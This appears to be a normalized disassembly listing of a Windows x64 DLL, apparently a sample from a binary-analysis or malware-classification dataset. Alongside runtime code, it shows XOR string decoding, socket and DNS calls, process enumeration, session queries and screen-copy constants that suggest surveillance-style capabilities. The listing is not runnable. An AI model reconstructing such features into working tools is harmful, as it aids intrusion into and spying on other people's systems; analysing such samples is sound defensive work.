mov eax [ rbx ]
mov edx eax
add eax eax
mov r8d ecx
mov [ rbx ] eax
lea eax [ rcx + rcx ]
shr edx 0x1f
or eax edx
shr r8d 0x1f
mov ecx 0xffff
mov [ rbx + 0x4 ] eax
mov eax [ rbx + 0x8 ]
add di cx
add eax eax
or eax r8d
bt eax 0xf
mov [ rbx + 0x8 ] eax
jae r-xdata
mov eax [ rbx + 0x4 ]
mov rcx [ rsp ]
xor edx edx
shr rcx 0x20
lea r9d [ rax + rcx ]
cmp r9d eax
jb r-xdata
lea eax [ r10 + 0x1 ]
xor ecx ecx
cmp eax r10d
jb r-xdata
mov [ rbx ] r8d
test eax eax
je r-xdata
mov edx r13d
cmp r9d ecx
jae r-xdata
mov ecx r13d
cmp eax r13d
jae r-xdata
mov eax [ rsp + 0x8 ]
mov ecx r9d
add r9d r9d
add [ rbx + 0x8 ] eax
mov edx [ rbx + 0x8 ]
shr ecx 0x1f
mov eax r8d
add r8d r8d
add edx edx
shr eax 0x1f
or edx ecx
mov [ rbx ] r8d
or r9d eax
mov [ rbx + 0x8 ] edx
xor r10d r10d
mov [ rbx + 0x4 ] r9d
movsx ecx [ rbp ]
lea eax [ r8 + rcx ]
mov [ rsp ] ecx
cmp eax r8d
jb r-xdata
add [ rbx + 0x8 ] r13d
mov [ rbx + 0x4 ] r9d
test edx edx
je r-xdata
lea eax [ r11 + 0x1 ]
mov [ rbx + 0x8 ] eax
mov [ rbx + 0x4 ] eax
test ecx ecx
je r-xdata
mov r10d r13d
cmp eax ecx
jae r-xdata
add rbp r13
add esi 0xffffffff
jne r-xdata
lea eax [ r9 + 0x1 ]
xor ecx ecx
cmp eax r9d
jb r-xdata
mov [ rbx ] eax
test r10d r10d
je r-xdata
mov rax [ rbx ]
mov r11d [ rbx + 0x8 ]
lea rcx [ rsp ]
mov [ rcx ] rax
mov eax [ rbx + 0x8 ]
add r11d r11d
mov [ rcx + 0x8 ] eax
mov ecx [ rbx ]
mov eax [ rbx + 0x4 ]
lea r9d [ rcx + rcx ]
mov edx ecx
lea r10d [ rax + rax ]
mov r8d eax
shr edx 0x1f
mov eax r9d
or r10d edx
shr r8d 0x1f
lea edx [ r9 + r9 ]
or r11d r8d
mov ecx r10d
shr eax 0x1f
shr ecx 0x1f
add r11d r11d
add r10d r10d
or r11d ecx
mov ecx [ rsp ]
or r10d eax
lea r8d [ rdx + rcx ]
xor eax eax
mov [ rbx ] edx
mov [ rbx + 0x4 ] r10d
mov [ rbx + 0x8 ] r11d
cmp r8d edx
jb r-xdata
mov ecx r13d
cmp eax r13d
jae r-xdata
lea eax [ rdx + 0x1 ]
mov [ rbx + 0x8 ] eax
mov [ rbx + 0x4 ] eax
test ecx ecx
je r-xdata
sub_1800232c0
sub rsp 0x10
mov [ rsp ] r10
mov [ rsp + 0x8 ] r11
xor r11 r11
lea r10 [ rsp + 0x18 ]
sub r10 rax
cmovb r10 r11
mov r11 [ gs : 0x10 ]
cmp r10 r11
jae r-xdata
mov r10 [ rsp ]
mov r11 [ rsp + 0x8 ]
add rsp 0x10
retn
and r10w 0xf000
lea r11 [ r11 - 0x1000 ]
mov [ r11 ] 0x0
cmp r10 r11
jne r-xdata
sub_180023320
sub rsp 0x28
mov [ rsp + 0x30 ] rcx
mov [ rsp + 0x38 ] rdx
mov [ rsp + 0x40 ] r8d
mov rdx [ rdx ]
mov rax rcx
call sub_180019700
call rax
call sub_180019730
mov rcx rax
mov rdx [ rsp + 0x38 ]
mov rdx [ rdx ]
mov r8d 0x2
call sub_180019700
add rsp 0x28
retn
sub_180023625
push rbp
sub rsp 0x40
mov rbp rdx
lea rax [ rbp + 0x40 ]
mov [ rsp + 0x30 ] rax
mov rax [ rbp + 0x90 ]
mov [ rsp + 0x28 ] rax
mov rax [ rbp + 0x88 ]
mov [ rsp + 0x20 ] rax
mov r9 [ rbp + 0x80 ]
mov r8 [ rbp + 0x78 ]
mov rdx [ rbp + 0x70 ]
call sub_18001e42c
add rsp 0x40
pop rbp
retn
sub_1800236c8
push rbp
sub rsp 0x20
mov rbp rdx
mov [ rbp + 0x70 ] rcx
mov [ rbp + 0x68 ] rcx
mov rax [ rbp + 0x68 ]
mov rcx [ rax ]
mov [ rbp + 0x28 ] rcx
mov [ rbp + 0x20 ] 0x0
mov rax [ rbp + 0x28 ]
mov r8d 0xe06d7363
cmp [ rax ] r8d
jne r-xdata
mov rax [ rbp + 0x28 ]
cmp [ rax ] r8d
jne r-xdata
mov rax [ rbp + 0x28 ]
cmp [ rax + 0x18 ] 0x4
jne r-xdata
mov [ rbp + 0x30 ] 0x0
mov rax [ rbp + 0x28 ]
cmp [ rax + 0x18 ] 0x4
jne r-xdata
mov rax [ rbp + 0x28 ]
cmp [ rax + 0x20 ] 0x19930520
je r-xdata
mov rax [ rbp + 0x28 ]
cmp [ rax + 0x20 ] 0x19930520
je r-xdata
mov rdx [ rbp + 0x28 ]
mov rax [ rbp + 0xd8 ]
mov rcx [ rax + 0x28 ]
cmp [ rdx + 0x28 ] rcx
jne r-xdata
mov rax [ rbp + 0x28 ]
cmp [ rax + 0x20 ] 0x19930521
je r-xdata
mov rax [ rbp + 0x28 ]
cmp [ rax + 0x30 ] 0x0
jne r-xdata
mov rax [ rbp + 0x28 ]
cmp [ rax + 0x20 ] 0x19930521
je r-xdata
mov [ rbp + 0x20 ] 0x1
mov rax [ rbp + 0x28 ]
cmp [ rax + 0x20 ] 0x19930522
jne r-xdata
call sub_180010a54
mov [ rax + 0x2c0 ] 0x1
mov [ rbp + 0x20 ] 0x1
mov [ rbp + 0x30 ] 0x1
jmp r-xdata
mov rax [ rbp + 0x28 ]
cmp [ rax + 0x20 ] 0x19930522
jne r-xdata
mov eax [ rbp + 0x30 ]
add rsp 0x20
pop rbp
retn
sub_1800237c8
push rbx
push rbp
sub rsp 0x28
mov rbp rdx
mov rcx [ rbp + 0x50 ]
call sub_18001e6c4
cmp [ rbp + 0x20 ] 0x0
jne r-xdata
call sub_180010a54
mov rcx [ rbp + 0xe0 ]
mov [ rax + 0xf0 ] rcx
call sub_180010a54
mov rcx [ rbp + 0xe8 ]
mov [ rax + 0xf8 ] rcx
add rsp 0x28
pop rbp
pop rbx
retn
mov r8d 0xe06d7363
mov rbx [ rbp + 0xd8 ]
cmp [ rbx ] r8d
jne r-xdata
cmp [ rbx + 0x18 ] 0x4
jne r-xdata
cmp [ rbx + 0x20 ] 0x19930520
je r-xdata
mov rcx [ rbx + 0x28 ]
call sub_18001e690
test eax eax
je r-xdata
cmp [ rbx + 0x20 ] 0x19930521
je r-xdata
mov dl 0x1
mov rcx rbx
call sub_18001fa5c
cmp [ rbx + 0x20 ] 0x19930522
jne r-xdata
sub_1800238a4
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
lea rcx [ rw-data ]
call [ DeleteCriticalSection@IAT ]
mov r11d [ rw-data ]
test r11d r11d
je r-xdata
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
xor edi edi
test r11d r11d
jle r-xdata
and [ rw-data ] 0x0
mov rax [ rw-data ]
mov rbx [ rax + 0x8 ]
mov rcx rax
call j_sub_18000e06c
inc edi
mov rax rbx
cmp edi [ rw-data ]
mov [ rw-data ] rbx
jl r-xdata
sub_180001204
lea rax [ r--data ]
mov [ rcx ] rax
mov rax rcx
retn
sub_180001214
push rbx
sub rsp 0x20
mov rbx rcx
call sub_180001238
test dl 0x1
je r-xdata
mov rax rbx
add rsp 0x20
pop rbx
retn
call j_sub_18000e06c
sub_180001238
lea rax [ r--data ]
mov [ rcx ] rax
retn
sub_180001244
and [ rdx + 0x14 ] 0x0
and [ rdx + 0x10 ] 0x0
mov [ rdx ] 0x67452301
mov [ rdx + 0x4 ] 0xefcdab89
mov [ rdx + 0x8 ] 0x98badcfe
mov [ rdx + 0xc ] 0x10325476
retn
sub_180001c78
test r9d r9d
je r-xdata
retn
sub r8 rdx
mov ecx r9d
mov al [ r8 + rdx ]
mov [ rdx ] al
inc rdx
sub rcx 0x1
jne r-xdata
sub_180001c94
sub rsp 0x28
mov rax rdx
test r9d r9d
je r-xdata
add rsp 0x28
retn
mov r8d r9d
xor edx edx
mov rcx rax
call sub_180016870
sub_180001f58
push rbx
sub rsp 0x20
xor edx edx
mov r8d 0x420
mov rbx rcx
call sub_180016870
mov rax rbx
add rsp 0x20
pop rbx
retn
sub_180001f78
mov rcx [ rcx ]
jmp [ closesocket@IAT ]
sub_180001f84
mov [ rcx ] rdx
retn
sub_180002538
push rbx
sub rsp 0x20
mov rcx r9
mov ebx r8d
call sub_18000a1ac
xor ecx ecx
cmp eax ebx
sete cl
mov eax ecx
add rsp 0x20
pop rbx
retn
sub_1800036b0
lea eax [ rcx + rdx ]
retn
sub_1800036c0
rol cx 0x8
mov ax cx
retn
sub_1800036c8
lea rax [ rsp + 0x28 ]
sub rax 0x28
retn
sub_1800036d4
and [ rsp + 0x28 ] 0x0
lea rax [ rsp + 0x28 ]
mov rax [ rax - 0x28 ]
sub rax 0x5
and rax 0xffffffffffff0000
retn
sub_1800077b4
push rbx
sub rsp 0x20
lea rdx [ r--data ]
mov rbx rcx
call sub_18000a28c
lea rdx [ r--data ]
mov rcx rbx
add rsp 0x20
pop rbx
jmp sub_18000a28c
sub_180007d90
lea rax [ r--data ]
mov [ rcx ] rax
xor eax eax
mov [ rcx + 0x8 ] eax
mov [ rcx + 0x10 ] rax
mov [ rcx + 0x18 ] rax
mov [ rcx + 0x20 ] rax
mov rax rcx
retn
sub_1800081cc
mov rax [ rcx + 0x20 ]
retn
sub_180008afc
mov rcx [ rcx + 0x18 ]
jmp [ SetEvent@IAT ]
sub_180008b08
sub rsp 0x28
mov rcx [ rcx + 0x18 ]
or edx 0xffffffff
call [ WaitForSingleObject@IAT ]
mov ecx 0x96
add rsp 0x28
jmp [ Sleep@IAT ]
sub_18000905c
mov al 0x1
retn
sub_180009060
mov eax [ rcx + 0x24 ]
retn
sub_18000970c
xchg [ rcx + 0x8 ] edx
retn
sub_180009a24
mov rax [ rcx + 0x98 ]
mov eax [ rax + 0x14 ]
retn
sub_180009a30
mov eax 0xcc0020
mov r8d 0x40cc0020
test dl dl
cmovne eax r8d
xchg [ rcx + 0x14 ] eax
retn
sub_180009a48
mov rax [ rcx + 0x98 ]
retn
sub_180009a50
mov ecx [ rcx + 0xa8 ]
cmp ecx 0x8
jg r-xdata
xor eax eax
mov eax 0x1
shl eax cl
jmp r-xdata
lea rax [ rax * 4 + 0x28 ]
retn
sub_180009c38
xor eax eax
mov [ rcx ] rax
mov [ rcx + 0x8 ] rax
mov [ rcx + 0x10 ] rax
mov rax rcx
retn
sub_18000a0b8
sub rsp 0x28
call [ gethostbyname@IAT ]
test rax rax
je r-xdata
add rsp 0x28
retn
mov rax [ rax + 0x18 ]
mov rcx [ rax ]
mov ecx [ rcx ]
call [ inet_ntoa@IAT ]
sub_18000a224
push rbx
sub rsp 0x20
lea r8 [ rsp + 0x38 ]
xor ebx ebx
mov edx 0x8004667e
mov [ rsp + 0x38 ] ebx
call [ ioctlsocket@IAT ]
cmp eax ebx
sete al
add rsp 0x20
pop rbx
retn
sub_18000b91c
xor eax eax
mov [ rcx + 0x1c ] r8w
mov [ rcx + 0x20 ] r9
mov [ rcx + 0x9 ] al
mov [ rcx + 0x8 ] al
mov [ rcx + 0x30 ] rax
mov [ rcx + 0x18 ] eax
mov [ rcx + 0x10 ] rax
mov [ rcx ] rdx
mov rax rcx
retn
sub_18000b940
mov ax [ rcx + 0x1c ]
retn
sub_18000b948
mov eax [ rcx + 0x18 ]
retn
sub_18000b94c
mov rax [ rcx + 0x30 ]
retn
sub_18000b954
mov [ rcx + 0x18 ] edx
retn
sub_18000b958
mov [ rcx + 0x10 ] rdx
retn
sub_18000bb54
cmp [ rcx + 0x9 ] 0x0
jne r-xdata
retn
mov [ rcx + 0x9 ] 0x1
sub_18000bb60
mov [ rcx + 0x28 ] edx
mov [ rcx + 0x2c ] r8w
retn
sub_18000bef0
push rbx
sub rsp 0x20
mov rbx rcx
add rcx 0x8
call [ DeleteCriticalSection@IAT ]
lea rcx [ rbx + 0x78 ]
add rsp 0x20
pop rbx
jmp sub_18000bbb8
sub_18000c180
add rcx 0x78
jmp sub_18000bca8
sub_18000c5c8
push rbx
sub rsp 0x20
mov rbx rcx
mov rcx [ rcx + 0x30 ]
or edx 0xffffffff
call [ WaitForSingleObject@IAT ]
mov rcx [ rbx + 0x30 ]
add rsp 0x20
pop rbx
jmp [ CloseHandle@IAT ]
sub_18000c630
and [ rcx + 0x6c ] 0x0
jmp sub_18000c1ec
sub_18000c6a0
sub rsp 0x28
lea rcx [ rw-data ]
call [ DeleteCriticalSection@IAT ]
mov rcx [ rw-data ]
add rsp 0x28
jmp [ CloseHandle@IAT ]
sub_18000c710
mov [ rsp + 0x18 ] r8
mov [ rsp + 0x20 ] r9
retn
sub_18000ca08
mov eax 0x63
mov ecx 0x2619
xor [ rdx ] cx
add rdx 0x2
sub eax 0x1
jne r-xdata
retn
Process32FirstW
jmp [ Process32FirstW@IAT ]
Process32NextW
jmp [ Process32NextW@IAT ]
CreateToolhelp32Snapshot
jmp [ CreateToolhelp32Snapshot@IAT ]
j_sub_18000dc18
jmp sub_18000dc18
WTSQuerySessionInformationW
jmp [ WTSQuerySessionInformationW@IAT ]
WTSFreeMemory
jmp [ WTSFreeMemory@IAT ]
DnsFree
jmp [ DnsFree@IAT ]
DnsQuery_W
jmp [ DnsQuery_W@IAT ]
sub_18000ccb8
mov edx [ rcx ]
or rax 0xffffffffffffffff
cmp edx 0x32335041
jne r-xdata
retn
mov edx [ rcx + 0x4 ]
cmp edx 0x18
jb r-xdata
mov eax [ rcx + 0x10 ]
sub_18000d240
sub rsp 0x28
call sub_180010a54
nop
mov rcx [ rax + 0x98 ]
call [ rax + 0x90 ]
mov ecx eax
call sub_18000d1fc
sub_18000d410
xor edx edx
lea r8d [ rdx + 0xa ]
jmp sub_1800118ec
sub_18000d41c
xor edx edx
lea r8d [ rdx + 0xa ]
jmp sub_180011bb4
j_sub_18000e06c
jmp sub_18000e06c
sub_18000db88
sub rsp 0x28
mov rax rdx
lea rdx [ rcx + 0x11 ]
lea rcx [ rax + 0x11 ]
call sub_1800132b0
xor ecx ecx
cmp eax ecx
sete al
add rsp 0x28
retn
sub_18000dba8
lea rax [ r--data ]
mov [ rcx ] rax
jmp sub_180013470
sub_18000dbf4
push rbx
sub rsp 0x20
mov rbx rcx
call sub_1800133f0
lea r11 [ r--data ]
mov [ rbx ] r11
mov rax rbx
add rsp 0x20
pop rbx
retn
sub_18000de8c
mov r9 r8
xor r8d r8d
jmp sub_18000dde0
sub_18000dfe4
sub rsp 0x28
call sub_18000dedc
neg rax
sbb eax eax
neg eax
dec eax
add rsp 0x28
retn
j_sub_18000e06c#2
jmp j_sub_18000e06c
sub_18000e250
sub rsp 0x38
mov [ rsp + 0x20 ] r9
xor r9d r9d
call sub_18000e164
add rsp 0x38
retn
sub_18000f5c0
sub rsp 0x28
lea rcx [ rsp + 0x30 ]
call [ GetSystemTimeAsFileTime@IAT ]
mov eax [ rsp + 0x30 ]
mov r11d [ rsp + 0x34 ]
shl r11 0x20
add r11 rax
xor eax eax
mov [ rw-data ] r11
add rsp 0x28
retn
sub_180010634
mov [ rw-data ] rcx
retn
FlsGetValue
jmp [ FlsGetValue@IAT ]
sub_1800108e0
mov eax [ rw-data ]
retn
sub_1800108e8
xor eax eax
retn
FlsSetValue
jmp [ FlsSetValue@IAT ]
sub_1800108f4
sub rsp 0x28
mov ecx [ rw-data ]
cmp ecx 0xffffffff
je r-xdata
add rsp 0x28
jmp sub_1800164a0
call [ FlsFree@IAT ]
or [ rw-data ] 0xffffffff
sub_1800110b8
sub rsp 0x28
mov eax 0xe06d7363
cmp ecx eax
jne r-xdata
xor eax eax
mov ecx eax
call sub_180010ee8
jmp r-xdata
add rsp 0x28
retn
sub_1800110d8
push rbx
sub rsp 0x20
mov ebx ecx
call sub_180014cf4
mov ecx ebx
call sub_180014acc
mov rcx [ rw-data ]
call DecodePointer
mov ecx 0xff
add rsp 0x20
pop rbx
jmp rax
sub_180011144
push rbx
sub rsp 0x20
mov ebx ecx
call sub_180011108
mov ecx ebx
call [ ExitProcess@IAT ]
sub_18001115c
mov ecx 0x8
jmp sub_180016624
sub_180011168
mov ecx 0x8
jmp sub_180016524
sub_180011420
xor r8d r8d
lea edx [ r8 + 0x1 ]
jmp sub_180011294
sub_18001142c
xor edx edx
xor ecx ecx
lea r8d [ rdx + 0x1 ]
jmp sub_180011294
sub_180012418
sub rsp 0x28
cmp [ rw-data ] 0x0
jne r-xdata
xor eax eax
add rsp 0x28
retn
mov ecx 0xfffffffd
call sub_180012220
mov [ rw-data ] 0x1
sub_180013358
sbb rax rax
sbb rax 0xffffffffffffffff
retn
sub_1800133d4
lea rax [ r--data ]
mov [ rcx ] rax
mov rax [ rdx ]
and [ rcx + 0x10 ] 0x0
mov [ rcx + 0x8 ] rax
mov rax rcx
retn
sub_180013470
sub rsp 0x28
cmp [ rcx + 0x10 ] 0x0
lea rax [ r--data ]
mov [ rcx ] rax
je r-xdata
add rsp 0x28
retn
mov rcx [ rcx + 0x8 ]
call sub_18000e06c
sub_180013494
mov rax [ rcx + 0x8 ]
test rax rax
jne r-xdata
retn
lea rax [ r--data ]
sub_1800134d8
mov [ rw-data ] rcx
retn
sub_1800135a8
mov rax rcx
movzx edx [ rax ]
add rax 0x2
test dx dx
jne r-xdata
sub rax rcx
sar rax 0x1
dec rax
retn
sub_180014aac
sub rsp 0x28
mov rcx [ rw-data ]
call [ HeapDestroy@IAT ]
and [ rw-data ] 0x0
add rsp 0x28
retn
sub_180016524
movsxd rcx ecx
lea rax [ rw-data ]
add rcx rcx
mov rcx [ rax + rcx * 8 ]
jmp [ LeaveCriticalSection@IAT ]
sub_180016a34
sub rsp 0x28
mov r8 [ r9 + 0x38 ]
mov rcx rdx
mov rdx r9
call sub_1800169d0
mov eax 0x1
add rsp 0x28
retn
sub_180017570
cmp rcx [ rw-data ]
jne r-xdata
jmp sub_18001ba30
rol rcx 0x10
test cx 0xffff
jne r-xdata
ror rcx 0x10
retn
sub_180019104
sub rsp 0x28
call sub_18001c464
cmp [ rw-data ] 0x0
je r-xdata
mov rcx [ rw-data ]
add rsp 0x28
jmp sub_18000e06c
call sub_18001c1fc
sub_180019214
sub rsp 0x28
cmp ecx 0x14
jge r-xdata
lea rcx [ rdx + 0x30 ]
call [ LeaveCriticalSection@IAT ]
btr [ rdx + 0x18 ] 0xf
add ecx 0x10
call sub_180016524
jmp r-xdata
add rsp 0x28
retn
sub_180019494
mov rcx [ rw-data ]
xor eax eax
or rcx 0x1
cmp [ rw-data ] rcx
sete al
retn
sub_180019620
xor r9d r9d
jmp sub_1800194ac
sub_1800196d0
sub rsp 0x4d8
xor r8 r8
xor r9 r9
mov [ rsp + 0x20 ] rsp
mov [ rsp + 0x28 ] r8
call RtlUnwindEx
add rsp 0x4d8
retn
sub_180019730
retn
sub_180019752
add rsp 0x28
retn
sub_180019777
add rsp 0x28
retn
sub_18001977c
sub rsp 0x28
lea rcx [ sub_180019734 ]
call __imp_EncodePointer
mov [ rw-data ] rax
add rsp 0x28
retn
sub_180019798
mov [ rw-data ] rcx
mov [ rw-data ] rcx
mov [ rw-data ] rcx
mov [ rw-data ] rcx
retn
sub_1800197b8
mov rcx [ rw-data ]
jmp DecodePointer
sub_180019a38
mov [ rw-data ] rcx
retn
sub_180019c04
mov [ rw-data ] rcx
retn
sub_180019c0c
mov [ rw-data ] rcx
retn
sub_180019c14
sub rsp 0x38
call [ InitializeCriticalSectionAndSpinCount@IAT ]
mov r11d eax
mov [ rsp + 0x20 ] eax
jmp r-xdata
mov eax r11d
add rsp 0x38
retn
sub_180019c27
cmp eax 0xc0000017
jne r-xdata
xor r11d r11d
mov [ rsp + 0x20 ] r11d
mov eax r11d
add rsp 0x38
retn
mov ecx 0x8
call [ SetLastError@IAT ]
sub_18001a9dc
sub rsp 0x38
and [ rsp + 0x20 ] 0x0
call sub_18001a7cc
add rsp 0x38
retn
sub_18001b368
sub rsp 0x38
mov rax [ rsp + 0x60 ]
and [ rsp + 0x28 ] 0x0
mov [ rsp + 0x20 ] rax
call sub_18001b26c
add rsp 0x38
retn
sub_18001b740
xor edx edx
lea r8d [ rdx + 0xa ]
jmp sub_18001cc44
sub_18001ba08
sub rsp 0x38
cmp r9d 0xa
jne r-xdata
and [ rsp + 0x20 ] 0x0
test ecx ecx
jns r-xdata
mov [ rsp + 0x20 ] 0x1
jmp r-xdata
call sub_18001b904
add rsp 0x38
retn
sub_18001bed4
mov edx ecx
mov r9d 0x4
xor r8d r8d
xor ecx ecx
jmp sub_18001be58
sub_18001c0c0
movsxd rdx ecx
lea rcx [ rw-data ]
mov rax rdx
and edx 0x1f
sar rax 0x5
imul rdx rdx 0x58
mov rax [ rcx + rax * 8 ]
lea rcx [ rax + rdx + 0x10 ]
jmp [ LeaveCriticalSection@IAT ]
sub_18001c464
mov ecx 0x1
jmp sub_18001c370
sub_18001c600
mov ecx 0x2
jmp sub_1800110d8
sub_18001d368
sub rsp 0x48
and [ rsp + 0x30 ] 0x0
and [ rsp + 0x28 ] 0x0
mov r8d 0x3
lea rcx [ r--data ]
xor r9d r9d
mov edx 0x40000000
mov [ rsp + 0x20 ] r8d
call [ CreateFileA@IAT ]
mov [ rw-data ] rax
add rsp 0x48
retn
RtlVirtualUnwind
jmp [ RtlVirtualUnwind@IAT ]
RtlLookupFunctionEntry
jmp [ RtlLookupFunctionEntry@IAT ]
RtlUnwindEx
jmp [ RtlUnwindEx@IAT ]
RtlPcToFileHeader
jmp [ RtlPcToFileHeader@IAT ]
sub_18001e110
retn 0x0
j_sub_18001e114
jmp sub_18001e114
sub_18001e2c0
push rbx
sub rsp 0x20
mov rbx rcx
call sub_180010a54
mov [ rax + 0x128 ] rbx
add rsp 0x20
pop rbx
retn
sub_18001e2dc
push rbx
sub rsp 0x20
mov rbx rcx
call sub_180010a54
mov [ rax + 0x130 ] rbx
add rsp 0x20
pop rbx
retn
sub_18001e92c
movsd xmm0 [ rcx ]
comisd xmm0 [ r--data ]
jb r-xdata
xor eax eax
retn
mov eax 0x1
retn
sub_18001e988
xor r9d r9d
jmp sub_18001e944
sub_18001e990
xor edx edx
jmp sub_18001e80c
sub_18001e998
xor edx edx
jmp sub_18001e88c
sub_18001f5b8
sub rsp 0x48
mov eax [ rsp + 0x78 ]
and [ rsp + 0x30 ] 0x0
mov [ rsp + 0x28 ] eax
mov eax [ rsp + 0x70 ]
mov [ rsp + 0x20 ] eax
call sub_18001f520
add rsp 0x48
retn
sub_18001f668
mov r8 [ rdx ]
jmp sub_18001f5dc
sub_18001f670
sub rsp 0x28
movsxd r9 [ r8 + 0x1c ]
mov rax [ rcx ]
mov r10 r8
mov eax [ r9 + rax ]
cmp eax 0xfffffffe
jne r-xdata
add rsp 0x28
retn
mov r8 [ rdx ]
mov rcx r10
call sub_18001f5dc
sub_18001f70c
lea rax [ r--data ]
mov [ rcx ] rax
jmp sub_180013470
sub_18001fa94
call sub_180019734
sub_18001ffdc
call sub_180019734
sub_18002009a
call sub_180019734
sub_180020914
push rbx
sub rsp 0x20
mov rbx rcx
call sub_1800133f0
lea r11 [ r--data ]
mov [ rbx ] r11
mov rax rbx
add rsp 0x20
pop rbx
retn
sub_180021010
mov rax [ rsp ]
mov [ rcx ] rax
retn
sub_180021018
neg rcx
sbb eax eax
and eax 0x1
retn
sub_180023360
push rbp
sub rsp 0x20
mov rbp rdx
mov rax [ rcx ]
mov rdx rcx
mov ecx [ rax ]
call sub_180010ee8
add rsp 0x20
pop rbp
retn
sub_18002337c
push rbp
sub rsp 0x20
mov rbp rdx
call sub_180011168
add rsp 0x20
pop rbp
retn
sub_180023390
push rbp
sub rsp 0x20
mov rbp rdx
mov ecx 0xc
call sub_180016524
add rsp 0x20
pop rbp
retn
sub_1800233a9
push rbp
sub rsp 0x30
mov rbp rdx
mov ecx 0xc
call sub_180016524
add rsp 0x30
pop rbp
retn
sub_1800233c9
push rbp
sub rsp 0x30
mov rbp rdx
mov ecx 0xc
call sub_180016524
add rsp 0x30
pop rbp
retn
sub_1800233e9
push rbp
sub rsp 0x30
mov rbp rdx
mov rax [ rbp + 0x70 ]
and [ rax + 0xc8 ] 0xffffffef
add rsp 0x30
pop rbp
retn
sub_180023403
push rbp
sub rsp 0x20
mov rbp rdx
mov rax [ rcx ]
mov rdx rcx
mov ecx [ rax ]
call sub_1800110b8
add rsp 0x20
pop rbp
retn
sub_18002341f
push rbp
sub rsp 0x20
mov rbp rdx
mov ecx 0xd
call sub_180016524
add rsp 0x20
pop rbp
retn
sub_18002343f
push rbp
sub rsp 0x20
mov rbp rdx
mov ecx 0xc
call sub_180016524
add rsp 0x20
pop rbp
retn
sub_180023460
push rbp
sub rsp 0x20
mov rbp rdx
mov rax [ rcx ]
xor ecx ecx
cmp [ rax ] 0xc0000005
sete cl
mov eax ecx
mov eax ecx
add rsp 0x20
pop rbp
retn
sub_180023481
push rbp
sub rsp 0x20
mov rbp rdx
cmp [ rbp + 0x80 ] 0x0
je r-xdata
add rsp 0x20
pop rbp
retn
mov ecx 0x8
call sub_180016524
sub_1800234a3
push rbp
sub rsp 0x20
mov rbp rdx
mov ecx 0xd
call sub_180016524
add rsp 0x20
pop rbp
retn
sub_1800234bc
push rbp
sub rsp 0x20
mov rbp rdx
mov ecx 0xe
call sub_180016524
add rsp 0x20
pop rbp
retn
sub_1800234d5
push rbp
sub rsp 0x20
mov rbp rdx
mov rcx [ rw-data ]
call [ LeaveCriticalSection@IAT ]
add rsp 0x20
pop rbp
retn
sub_1800234f1
push rbp
sub rsp 0x30
mov rbp rdx
cmp [ rbp + 0x70 ] 0x0
je r-xdata
add rsp 0x30
pop rbp
retn
xor ecx ecx
call sub_180016524
sub_18002350d
push rbp
sub rsp 0x20
mov rbp rdx
mov rax [ rcx ]
xor r11d r11d
cmp [ rax ] 0xc0000017
sete r11b
mov eax r11d
add rsp 0x20
pop rbp
retn
sub_18002352f
push rbp
sub rsp 0x20
mov rbp rdx
mov ecx 0xa
call sub_180016524
add rsp 0x20
pop rbp
retn
sub_180023548
push rbp
sub rsp 0x20
mov rbp rdx
mov ecx 0x1
call sub_180016524
add rsp 0x20
pop rbp
retn
sub_180023561
push rbp
sub rsp 0x20
mov rbp rdx
movsxd rcx [ rbp + 0x20 ]
mov rax rcx
mov rdx [ rw-data ]
mov rdx [ rdx + rcx * 8 ]
call sub_180019214
add rsp 0x20
pop rbp
retn
sub_180023591
push rbp
sub rsp 0x20
mov rbp rdx
mov ecx 0x1
call sub_180016524
add rsp 0x20
pop rbp
retn
sub_1800235aa
push rbp
sub rsp 0x30
mov rbp rdx
mov rcx [ rbp + 0x48 ]
call sub_1800191bc
add rsp 0x30
pop rbp
retn
sub_1800235c2
push rbp
sub rsp 0x30
mov rbp rdx
mov rcx [ rbp + 0x40 ]
call sub_1800191bc
add rsp 0x30
pop rbp
retn
sub_1800235da
push rbp
sub rsp 0x30
mov rbp rdx
mov ecx [ rbp + 0x60 ]
call sub_18001c0c0
add rsp 0x30
pop rbp
retn
sub_1800235f1
push rbp
sub rsp 0x30
mov rbp rdx
mov ecx [ rbp + 0x50 ]
call sub_18001c0c0
add rsp 0x30
pop rbp
retn
sub_180023608
mov [ rsp + 0x10 ] rdx
push rbp
sub rsp 0x30
mov rbp rdx
lea rax [ r-xdata ]
jmp r-xdata
add rsp 0x30
pop rbp
retn
sub_180023669
push rbp
sub rsp 0x20
mov rbp rdx
call sub_18001f87c
add rsp 0x20
pop rbp
retn
sub_180023689
push rbp
sub rsp 0x20
mov rbp rdx
call sub_180010a54
cmp [ rax + 0x100 ] 0x0
jle r-xdata
add rsp 0x20
pop rbp
retn
call sub_180010a54
dec [ rax + 0x100 ]
sub_1800236b1
push rbp
sub rsp 0x20
mov rbp rdx
xor eax eax
cmp [ rbp + 0x38 ] al
setne al
add rsp 0x20
pop rbp
retn
sub_180023858
sub rsp 0x28
lea rcx [ rw-data ]
call [ InitializeCriticalSection@IAT ]
lea rcx [ sub_1800238a4 ]
add rsp 0x28
jmp sub_18000dfe4
sub_18002387c
sub rsp 0x28
lea rdx [ r--data ]
lea rcx [ rw-data ]
call sub_18000c63c
lea rcx [ sub_180023908 ]
add rsp 0x28
jmp sub_18000dfe4
sub_180023908
lea rcx [ rw-data ]
jmp sub_18000c6a0
sub_180023914
lea rax [ r--data ]
lea rcx [ rw-data ]
mov [ rw-data ] rax
jmp sub_180013470
